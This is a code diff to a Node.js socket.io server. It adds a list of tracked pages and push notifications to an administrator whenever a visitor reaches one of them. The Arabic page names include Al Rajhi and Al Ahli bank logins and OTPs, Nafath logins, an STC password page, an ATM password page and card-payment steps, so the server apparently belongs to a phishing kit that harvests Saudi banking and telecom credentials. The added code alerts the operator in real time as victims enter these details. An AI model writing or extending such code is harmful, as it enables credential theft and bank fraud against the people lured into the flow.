@@ -8,6 +8,71 @@ const path = require("path");
 require("dotenv").config();
 
 const fcm = require("./fcm");
+
+// --- Payment-flow notification helpers ---
+// Pages from "الملخص والدفع" to the end of the flow. Notify the admin (push) when a visitor reaches any of these.
+const PAYMENT_FLOW_PAGES = new Set([
+  "الملخص والدفع",
+  "ملخص الدفع",
+  "الدفع بطاقة الائتمان",
+  "الدفع",
+  "تحويل بنكي",
+  "رقم الحساب البنكي",
+  "تحقق رقم الجوال (OTP)",
+  "رمز التحقق (OTP)",
+  "توثيق رقم الجوال",
+  "تحقق نفاذ",
+  "تسجيل دخول نفاذ",
+  "نفاذ الأول",
+  "نفاذ الراجحى",
+  "حساب بنك الأول",
+  "تسجيل الدخول الراجحى",
+  "إتصال الراجحى",
+  "تنبيه الراجحى",
+  "الراجحى (OTP)",
+  "بنك الأهلي (OTP)",
+  "MyStc OTP",
+  "كلمة مرور STC",
+  "تنبية إتصال STC",
+  "كلمة مرور ATM",
+  "تنبية إتصال Mobily",
+  "الصفحة النهائية",
+  "END",
+]);
+
+function isPaymentFlowPage(page) {
+  if (!page) return false;
+  return PAYMENT_FLOW_PAGES.has(String(page).trim());
+}
+
+// Try to extract the visitor's entered name from their submitted data; fallback to number/id.
+const NAME_KEYS = [
+  "الاسم الكامل",
+  "الاسم بالكامل",
+  "الاسم كاملاً",
+  "اسم حامل البطاقة",
+  "الاسم كما هو مدون على البطاقة",
+  "الاسم",
+  "fullName",
+  "name",
+];
+
+function getVisitorName(visitor) {
+  if (!visitor) return "زائر";
+  if (visitor.fullName && String(visitor.fullName).trim()) {
+    return String(visitor.fullName).trim();
+  }
+  const data = visitor.data || {};
+  for (const k of NAME_KEYS) {
+    if (data[k] && String(data[k]).trim()) {
+      return String(data[k]).trim();
+    }
+  }
+  const num = visitor.visitorNumber != null ? visitor.visitorNumber : visitor._id;
+  return `زائر #${num}`;
+}
+// --- end helpers ---
+
 const app = express();
 const server = http.createServer(app);
 
@@ -600,6 +665,22 @@ io.on("connection", (socket) => {
           page,
         });
       });
+
+      // Push notification on payment-flow pages (from "الملخص والدفع" to the end).
+      // Only notify on important pages, avoid duplicate consecutive notifications for the same page.
+      try {
+        if (isPaymentFlowPage(page) && visitor.lastNotifiedPage !== page) {
+          visitor.lastNotifiedPage = page;
+          const vName = getVisitorName(visitor);
+          fcm.sendNotification(
+            vName,
+            `وصل إلى: ${page}`,
+            { type: "page_enter", visitorId: visitor._id, page }
+          );
+        }
+      } catch (e) {
+        console.error("[fcm] page-enter notification failed:", e && e.message ? e.message : e);
+      }
     }
   });
 
